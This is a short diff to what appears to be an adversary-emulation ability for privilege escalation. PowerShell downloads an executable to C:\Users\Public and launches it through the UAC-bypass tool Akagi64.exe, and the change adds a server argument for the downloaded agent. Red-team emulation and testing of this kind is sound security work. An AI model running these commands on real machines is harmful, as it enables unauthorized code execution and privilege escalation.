@@ -17,7 +17,7 @@
           $data=$wc.DownloadData($url);
           $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");
           [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);
-          .\Akagi64.exe 32 C:\Users\Public\$name.exe
+          .\Akagi64.exe 32 "C:\Users\Public\$name.exe -server #{server}"
         payload: Akagi64.exe
   tactic: privilege-escalation
   technique:
